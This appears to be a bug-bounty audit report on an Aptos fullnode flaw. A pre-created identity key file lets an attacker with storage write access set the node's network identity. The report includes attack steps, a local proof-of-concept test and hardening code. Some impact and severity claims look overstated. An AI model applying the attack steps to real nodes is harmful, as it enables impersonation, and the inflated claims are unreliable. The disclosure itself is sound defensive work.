# Audit Report

## Title
Network Identity Hijacking via Pre-Created Ephemeral Identity Key File

## Summary
An attacker with filesystem access to the node's storage directory can pre-create the `ephemeral_identity_key` file with a known private key before node initialization, causing the node to adopt an attacker-controlled network identity. This enables man-in-the-middle attacks on P2P communications and potential disruption of consensus operations.

## Finding Description

The vulnerability exists in the identity key loading mechanism for fullnode networks. The code uses a predictable filename without any validation when loading network identity keys from disk. [1](#0-0) 

The vulnerability manifests in the `optimize_public_network_config()` function, which loads network identity from a file if it exists: [2](#0-1) 

The critical flaw is in the `Identity::load_identity()` function, which reads any file at the specified path without performing security validations: [3](#0-2) 

The function performs NO checks for:
- File ownership validation
- File permission verification (should be 0600)
- Integrity validation (no signature, hash, or checksum)
- Creation timestamp verification

**Attack Path:**
1. Attacker gains write access to the storage directory (default: `/opt/aptos/data/db/`)
2. Attacker generates an x25519 private key they control
3. Attacker writes the 32-byte private key to `/opt/aptos/data/db/ephemeral_identity_key`
4. Node initializes and loads the attacker's key as its network identity
5. Node's peer_id is derived from the attacker's public key
6. Attacker can now intercept and manipulate P2P communications

The network handshake correctly validates that peer_id matches the public key, but this provides no protection since both are derived from the attacker's key: [4](#0-3) 

## Impact Explanation

This vulnerability meets **High Severity** criteria per the Aptos bug bounty program:

**Significant Protocol Violations:**
- Compromises the integrity of P2P network authentication
- Enables man-in-the-middle attacks on consensus messages, state sync, and transaction propagation
- For validator fullnodes (VFNs), this can disrupt validator operations by intercepting validator-VFN communications
- Attackers can selectively drop or delay messages, causing liveness degradation

**Network Layer Compromise:**
- The attacker controls the node's network identity permanently (persists across restarts)
- Can impersonate the node to other peers
- Can decrypt all incoming messages intended for the compromised node
- Can perform targeted attacks against specific network participants

While this doesn't directly cause fund loss or consensus safety violations (which would be Critical), it enables "significant protocol violations" and "validator node slowdowns" as defined in the High Severity category.

## Likelihood Explanation

**Medium-High Likelihood** in certain deployment scenarios:

**Attack Prerequisites:**
- Write access to the node's storage directory before initialization
- Knowledge of the predictable filename (publicly visible in source code)

**Vulnerable Scenarios:**
1. **Containerized Deployments**: If Docker volumes or Kubernetes persistent volumes are misconfigured with permissive access modes
2. **Shared Hosting Environments**: Multiple services sharing filesystem access
3. **Cloud Storage Misconfiguration**: Shared network file systems (NFS, EFS) with improper ACLs
4. **Initial Setup Race Conditions**: During automated node provisioning, if storage is prepared by untrusted scripts
5. **Compromised Auxiliary Systems**: If monitoring or backup systems have write access to the storage directory

The default storage directory is: [5](#0-4) [6](#0-5) 

Combining to: `/opt/aptos/data/db/ephemeral_identity_key`

## Recommendation

Implement multi-layered security controls:

**1. File Ownership and Permission Validation:**
```rust
pub fn load_identity(path: &PathBuf) -> anyhow::Result<Option<Self>> {
    if path.exists() {
        // Validate file permissions are 0600 (user read/write only)
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let metadata = fs::metadata(path)?;
            let mode = metadata.permissions().mode();
            if mode & 0o777 != 0o600 {
                return Err(anyhow!(
                    "Identity file has insecure permissions: {:o}. Expected 0600",
                    mode & 0o777
                ));
            }
        }
        
        let bytes = fs::read(path)?;
        let private_key_bytes: [u8; PRIVATE_KEY_SIZE] = bytes.as_slice().try_into()?;
        let private_key = x25519::PrivateKey::from(private_key_bytes);
        let peer_id = from_identity_public_key(private_key.public_key());
        Ok(Some(Identity::from_config(private_key, peer_id)))
    } else {
        Ok(None)
    }
}
```

**2. Use Secure File Writing with Restrictive Permissions:**
```rust
pub fn save_private_key(path: &PathBuf, key: &x25519::PrivateKey) -> anyhow::Result<()> {
    let parent_path = path.parent().unwrap();
    fs::create_dir_all(parent_path)?;
    
    // Use secure file creation with 0600 permissions
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt;
        let mut opts = OpenOptions::new();
        opts.mode(0o600);
        opts.write(true)
            .create_new(true) // Fail if file already exists
            .open(path)?
            .write_all(&key.to_bytes())?;
    }
    
    #[cfg(not(unix))]
    {
        File::create(path)?
            .write_all(&key.to_bytes())?;
    }
    
    Ok(())
}
```

**3. Add Integrity Protection:**
Consider adding HMAC or signature validation using a key derived from the node's validator key or a separately secured configuration key.

**4. Use create_new() Flag:**
The current code should use `create_new(true)` instead of `create(true)` to fail if an attacker has pre-created the file: [7](#0-6) 

**5. Reference Secure Implementation:**
The codebase already has secure file writing functions that should be used: [8](#0-7) 

## Proof of Concept

```rust
// PoC: Demonstrate identity hijacking attack
use aptos_config::config::{Identity, NodeConfig, NetworkConfig};
use aptos_crypto::{x25519, ValidCryptoMaterial, Uniform};
use std::fs::{self, File};
use std::io::Write;
use std::path::PathBuf;
use tempfile::tempdir;

#[test]
fn test_identity_hijacking_vulnerability() {
    // Setup: Create temporary storage directory
    let temp_dir = tempdir().unwrap();
    let storage_dir = temp_dir.path().join("db");
    fs::create_dir_all(&storage_dir).unwrap();
    
    // ATTACK STEP 1: Attacker generates their own private key
    let mut rng = rand::rngs::OsRng;
    let attacker_private_key = x25519::PrivateKey::generate(&mut rng);
    let attacker_public_key = attacker_private_key.public_key();
    
    println!("[ATTACKER] Generated private key: {:?}", 
             hex::encode(attacker_private_key.to_bytes()));
    println!("[ATTACKER] Public key: {:?}", 
             hex::encode(attacker_public_key.to_bytes()));
    
    // ATTACK STEP 2: Pre-create the identity file with attacker's key
    let identity_file = storage_dir.join("ephemeral_identity_key");
    let mut file = File::create(&identity_file).unwrap();
    file.write_all(&attacker_private_key.to_bytes()).unwrap();
    println!("[ATTACKER] Pre-created identity file at: {:?}", identity_file);
    
    // ATTACK STEP 3: Node initializes and loads the malicious key
    let loaded_identity = Identity::load_identity(&identity_file).unwrap();
    
    match loaded_identity {
        Some(Identity::FromConfig(config)) => {
            let loaded_private = config.key.private_key();
            let loaded_peer_id = config.peer_id;
            
            println!("[NODE] Loaded private key: {:?}", 
                     hex::encode(loaded_private.to_bytes()));
            println!("[NODE] Derived peer_id: {}", loaded_peer_id);
            
            // ATTACK SUCCESS: Node uses attacker's key
            assert_eq!(loaded_private.to_bytes(), attacker_private_key.to_bytes(),
                      "Node loaded attacker's private key!");
            assert_eq!(loaded_peer_id, 
                      aptos_types::account_address::from_identity_public_key(attacker_public_key),
                      "Node's peer_id is controlled by attacker!");
            
            println!("\n[VULNERABILITY CONFIRMED]");
            println!("- Node adopted attacker-controlled network identity");
            println!("- Attacker can decrypt all messages to this peer_id");
            println!("- Attacker can impersonate this node in P2P network");
        }
        _ => panic!("Failed to load identity - vulnerability not exploitable")
    }
}
```

**Expected Output:**
```
[ATTACKER] Generated private key: <32-byte hex>
[ATTACKER] Public key: <32-byte hex>
[ATTACKER] Pre-created identity file at: "/tmp/.../db/ephemeral_identity_key"
[NODE] Loaded private key: <same 32-byte hex>
[NODE] Derived peer_id: <address derived from attacker's key>

[VULNERABILITY CONFIRMED]
- Node adopted attacker-controlled network identity
- Attacker can decrypt all messages to this peer_id
- Attacker can impersonate this node in P2P network
```

## Notes

**Additional Context:**

1. This vulnerability only affects **public fullnode networks** where auto-generated identities are used. Validator networks use explicitly configured identities from secure storage.

2. The codebase already has secure file handling utilities but they are not used for identity keys, suggesting this was an oversight rather than a deliberate design choice.

3. The vulnerability is persistent - once exploited, the attacker's key remains loaded across all node restarts until manually removed.

4. Detection is difficult because the compromised node will appear to function normally while silently exposing all its network communications to the attacker.

5. This represents a violation of the **Cryptographic Correctness** invariant: "BLS signatures, VRF, and hash operations must be secure." While the cryptography itself is sound, the key management allows identity substitution.

### Citations

**File:** config/src/config/config_optimizer.rs (L28-28)
```rust
const IDENTITY_KEY_FILE: &str = "ephemeral_identity_key";
```

**File:** config/src/config/config_optimizer.rs (L220-232)
```rust
            if let Identity::FromConfig(IdentityFromConfig {
                source: IdentitySource::AutoGenerated,
                key: config_key,
                ..
            }) = &fullnode_network_config.identity
            {
                let path = node_config.storage.dir().join(IDENTITY_KEY_FILE);
                if let Some(loaded_identity) = Identity::load_identity(&path)? {
                    fullnode_network_config.identity = loaded_identity;
                } else {
                    Identity::save_private_key(&path, &config_key.private_key())?;
                }
            }
```

**File:** config/src/config/identity_config.rs (L105-115)
```rust
    pub fn load_identity(path: &PathBuf) -> anyhow::Result<Option<Self>> {
        if path.exists() {
            let bytes = fs::read(path)?;
            let private_key_bytes: [u8; PRIVATE_KEY_SIZE] = bytes.as_slice().try_into()?;
            let private_key = x25519::PrivateKey::from(private_key_bytes);
            let peer_id = from_identity_public_key(private_key.public_key());
            Ok(Some(Identity::from_config(private_key, peer_id)))
        } else {
            Ok(None)
        }
    }
```

**File:** config/src/config/identity_config.rs (L123-125)
```rust
        File::create(path)?
            .write_all(&key.to_bytes())
            .map_err(|error| error.into())
```

**File:** network/framework/src/noise/handshake.rs (L394-404)
```rust
                        let derived_remote_peer_id =
                            aptos_types::account_address::from_identity_public_key(
                                remote_public_key,
                            );
                        if derived_remote_peer_id != remote_peer_id {
                            // The peer ID is not constructed correctly from the public key
                            Err(NoiseHandshakeError::ClientPeerIdMismatch(
                                remote_peer_short,
                                remote_peer_id,
                                derived_remote_peer_id,
                            ))
```

**File:** config/src/config/storage_config.rs (L437-437)
```rust
            dir: PathBuf::from("db"),
```

**File:** config/src/config/storage_config.rs (L446-446)
```rust
            data_dir: PathBuf::from("/opt/aptos/data"),
```

**File:** crates/aptos/src/common/utils.rs (L224-229)
```rust
pub fn write_to_user_only_file(path: &Path, name: &str, bytes: &[u8]) -> CliTypedResult<()> {
    let mut opts = OpenOptions::new();
    #[cfg(unix)]
    opts.mode(0o600);
    write_to_file_with_opts(path, name, bytes, &mut opts)
}
```
